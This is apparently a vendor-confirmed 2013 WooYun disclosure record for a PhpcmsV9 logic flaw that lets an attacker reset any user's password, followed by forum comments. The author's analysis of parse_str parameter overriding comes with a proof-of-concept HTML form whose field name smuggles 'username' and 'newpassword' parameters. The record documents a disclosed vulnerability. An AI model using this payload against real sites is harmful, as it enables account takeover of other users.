{"id": 14456, "wybug_id": "wooyun-2013-017119", "wybug_title": "PhpcmsV9 任意用户密码修改逻辑漏洞 2013年贺岁第三发", "wybug_corp": "phpcms", "wybug_author": "我想拿个shell", "wybug_date": "2013-01-09 11:37", "wybug_open_date": "2013-02-23 11:38", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计错误", "逻辑错误", "任意密码修改"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-23：\t细节向公众公开  简要描述： 由于某处的实现机制没有考虑到某个条件，导致了一个任意用户密码重置漏洞。建议漏洞危害设置为高。 详细说明：  其实我在发第一个漏洞的时候，就看到了 WooYun: PhpcmsV9 SQL注射 2013年贺岁第一发 提到的通行证的代码：\nparse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);\n在phpsso_server/phpcms/modules/phpsso/classes/phpsso.class.php中。我把它留给了你们。不知道你们发现了它没有。我们知道parse_str类似将http请求转换成php变量的函数，所以，也像http请求在php的环境下一样，如果提交?a=sss&a=aaa，那么a的结果会是aaa，不是sss。所以我们知道这个函数有一个问题了，如果后面提交一个内容，它会覆盖前面的。也就是username=zhangsan&username=lisi的话，那么用户名就不是zhangsan了。要构造这样的请求，我们还是要回到通行证的client看看，我们有没有这样的机会。其实我们有这样的机会，看看代码，如下：\npublic function auth_data($data) {\t\t$s = $sep = '';\t\tforeach($data as $k => $v) {\t\t\tif(is_array($v)) {\t\t\t\t$s2 = $sep2 = '';\t\t\t\tforeach($v as $k2 => $v2) {\t\t\t\t\t\t$s2 .= \"$sep2{$k}[$k2]=\".$this->_ps_stripslashes($v2);\t\t\t\t\t$sep2 = '&';\t\t\t\t}\t\t\t\t$s .= $sep.$s2;\t\t\t} else {\t\t\t\t$s .= \"$sep$k=\".$this->_ps_stripslashes($v);\t\t\t}\t\t\t$sep = '&';\t\t}\t\t$auth_s = 'v='.$this->ps_vsersion.'&appid='.APPID.'&data='.urlencode($this->sys_auth($s));\t\treturn $auth_s;\t}\n可能我没说明白，对，传递进来的数组的key是可控的。如果我的key里包含[]&这样三个字符的话，那么我就能重写这样的东西。举个例子$a[aaa=a&bbb] = 'a';会变成aaa=a&bbb=a明白了么，对，就是通过没有注意到的key，我们可以构造出多余的参数来。这个时候，我们可以再去看一个函数。就在这个文件内：\npublic function ps_member_edit($username, $email, $password='', $newpassword='', $uid='', $random='') {\t\tif($email && !$this->_is_email($email)) {\t\t\treturn -4;\t\t}\t\treturn $this->_ps_send('edit', array('username'=>$username, 'password'=>$password, 'newpassword'=>$newpassword, 'email'=>$email, 'uid'=>$uid, 'random'=>$random));\t}\n这是向通行证发了这样一个请求。我们再跟到通信证代码里去看看，就会有所发现。\npublic function edit() {//能省就省，太长了不是吗？if($this->username) {//如果提交了用户名，则按照用户名修改记录，反之，按照uid来修改记录。\t\t\t\t$res = $this->db->update($data, array('username'=>$this->username));\t\t\t} else {\t\t\t\tfile_put_contents('typeb.txt',print_r($data,1).$this->uid);\t\t\t\t$res = $this->db->update($data, array('uid'=>$this->uid));\t\t\t}\n好，我们知道了，如果提交了用户名，就会按照用户名来修改记录，不然就按照uid，我们看看函数结构：public function ps_member_edit($username, $email, $password='', $newpassword='', $uid='', $random='')很好，uid要是无法控制的话，后面只剩下一个random了，但是username就在第一个，只要email，password，newpassword，有任何一个可以控制，就可以修改密码了。我当然找到了：phpcms9/phpcms/modules/member/index.php\n$res = $this->client->ps_member_edit('', $email, $_POST['info']['password'], $_POST['info']['newpassword'], $this->memberinfo['phpssouid'], $this->memberinfo['encrypt']);\n然后就没有然后了。   漏洞证明：  我还是给个视频说明吧。密码：nicai第四分钟后就别看了，我从虚拟机切出来时我电脑卡了。此次用到的表单如下：\n<form method=\"post\" action=\"http://localhost/phpcms9/index.php?m=member&c=index&a=account_manage_password&t=1\" id=\"myform\" name=\"myform\">\t\t\t\t<table width=\"100%\" cellspacing=\"0\" class=\"table_form\">\t\t\t\t\t<tr>\t\t\t\t\t\t<th width=\"80\">邮箱：</th>        \t\t\t\t\t\t<td><input name=\"info[email]\" type=\"text\" id=\"email\" size=\"30\" value=\"jj@jj.com\" class=\"input-text\"></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th width=\"80\">原密码：</th>        \t\t\t\t\t\t<td><input name=\"info[password]\" type=\"password\" id=\"password\" size=\"30\" value=\"111111\" class=\"input-text\"></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>新密码：</th>\t\t\t\t\t\t<td><input name=\"info[newpassword][%5D=aaa%5D%5B&username=cc&newpassword=aaaaaa&]\" type=\"password\" id=\"newpassword\" size=\"30\" value=\"\" class=\"input-text\"></td>\t\t\t\t\t</tr>\t\t\t\t\t<th></th>\t\t\t\t\t<td><input name=\"dosubmit\" type=\"submit\" id=\"dosubmit\" value=\"提交\" class=\"button\"></td>\t\t\t\t\t</tr>\t\t\t\t</table>\t\t\t\t\t\t\t</form>\n   修复方案：  urlencode那个key和value话说，你看看，每次都是这么精彩的分析，这么能说明问题的漏洞，这样好的证明以及实际可用的解决方案，为啥会拿和那种无聊xss一样的rank值呢？要有审美观。   版权声明：转载请注明来源 我想拿个shell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-01-09 13:27 厂商回复： 感谢，请联系我们官网客服，留下你的联系方式！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-09 11:44 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  来了 来了 又来了     \n     2013-01-09 11:44 |    \t\t我想拿个shell \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:5        | 好码近似诗，挫码不如屎。)\t\t \n  视频还是有点看不清楚，不过我给了poc代码，我只能做到这里了。    \n     2013-01-09 11:55 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  1月最佳洞主？    \n     2013-01-09 11:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @风萧萧 这个最佳洞主咋选啊    \n     2013-01-09 12:05 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @xsser 管理选出最佳洞主的候选，然后所有白帽子投票。BTW,开发个投票系统撒！    \n     2013-01-09 12:20 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @xsser 最佳，肯定看整体洞洞内容了撒    \n     2013-01-09 12:22 |    \t\t我想拿个shell \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:5        | 好码近似诗，挫码不如屎。)\t\t \n  @se55i0n 按照质量，我觉得我可以是个首席分析师。    \n     2013-01-09 12:27 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @我想拿个shell 老实交代，你是哪个大牛的马甲...    \n     2013-01-09 12:36 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  洞主来个dz的~    \n     2013-01-09 13:17 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  只可以说我继续关注     \n     2013-01-09 13:20 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  碉堡了，来个10连发！    \n     2013-01-09 13:31 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  /whitehat_detail.php?whitehat=tenzy  严重怀疑马甲是这个！    \n     2013-01-09 13:33 |    \t\tClar \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 当前无)\t\t \n  洞主威武！    \n     2013-01-09 13:57 |    \t\t我想拿个shell \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:5        | 好码近似诗，挫码不如屎。)\t\t \n  @疯子 还真不是。    \n     2013-01-29 23:57 |    \t\thacx \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:6        )\t\t \n  视频看不清啊。。。    \n     2013-01-30 09:43 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  这个还真精彩...    \n     2013-01-30 18:07 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  分析的很不错，支持洞主    \n     2013-01-30 18:24 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @我想拿个shell <th>新密码：</th>\t\t\t\t\t\t<td><input name=\"info[newpassword][%5D=aaa%5D%5B&username=cc&newpassword=aaaaaa&]\" type=\"password\" id=\"newpassword\" size=\"30\" value=\"\" class=\"input-text\"></td>\t\t\t\t\t</tr>中的%5D=aaa%5D%5B有什么作用    \n     2013-01-30 18:26 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @风萧萧 @疯子 @hacx @xsser @疯狗 <th>新密码：</th> <td><input name=\"info[newpassword][%5D=aaa%5D%5B&username=cc&newpassword=aaaaaa&]\" type=\"password\" id=\"newpassword\" size=\"30\" value=\"\" class=\"input-text\"></td> </tr> 中的%5D=aaa%5D%5B有什么作用     \n     2013-01-30 18:28 |    \t\tRay \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:7        )\t\t \n  @_Evil 没用。    \n     2013-01-30 18:30 |    \t\t我想拿个shell \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:5        | 好码近似诗，挫码不如屎。)\t\t \n  @Ray @_Evil 对 确实是没有用，这个是在测试的时候没有删，实际上后来看代码，value也没有urlencode的。    \n     2013-01-30 21:53 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  厂商回复：感谢，请联系我们官网客服，留下你的联系方式！！    \n     2013-01-30 21:57 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @我想拿个shell         value利用表单怎么写呢。 感谢分享    \n     2013-01-31 10:53 |    \t\t我想拿个shell \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:5        | 好码近似诗，挫码不如屎。)\t\t \n  @_Evil value就不需要修改表单了，直接在对应的参数写a&b&c就可以了。    \n     2013-02-23 15:22 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  这神马漏洞呢，要知道原密码，改密码直接可以在后台改呀    \n     2013-02-23 16:34 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  为什么我测试以后老是提示原密码不正确呢    \n     2013-11-20 12:01 |    \t\t士大夫 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:37        | 杭州WEB安全小组)\t\t \n  测试的时候提示老是提示原始密码错误。是怎么回事啊。原始密码填的是当前登录密码吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}